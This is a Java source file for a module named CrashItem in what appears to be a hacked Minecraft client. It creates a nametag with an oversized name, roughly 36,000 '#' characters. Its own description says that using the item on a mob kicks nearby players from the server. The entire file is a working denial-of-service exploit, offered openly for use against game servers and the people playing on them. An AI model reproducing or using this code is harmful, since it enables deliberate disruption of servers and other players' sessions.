
package component.CFXW_client.mods;

import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;

@Mod.Info(category = Mod.Category.EXPLOITS,
	description = "Generates a CrashItem.\n"
		+ "Right click a mob with it to kick nearby players from the server.",
	name = "CrashItem")
public class CrashItemMod extends Mod
{
	@Override
	public void onEnable()
	{
		if(mc.thePlayer.inventory.getCurrentItem() == null
			|| !(mc.thePlayer.inventory.getCurrentItem().getItem() instanceof ItemNameTag))
		{
			CFXW.chat.error("You are not holding a nametag in your hand.");
			setEnabled(false);
			return;
		}else if(!mc.thePlayer.capabilities.isCreativeMode)
		{
			CFXW.chat.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		String stackName = "";
		for(int i = 0; i < 3000; i++)
		{
			StringBuilder builder = new StringBuilder().append(stackName);
			stackName = builder.append("############").toString();
		}
		mc.thePlayer.inventory.getCurrentItem().setStackDisplayName(stackName);
		mc.displayGuiScreen(new GuiInventory(mc.thePlayer));
		mc.thePlayer.closeScreen();
		CFXW.chat.message("CrashItem created. Right click a mob with it.");
		setEnabled(false);
	}
}
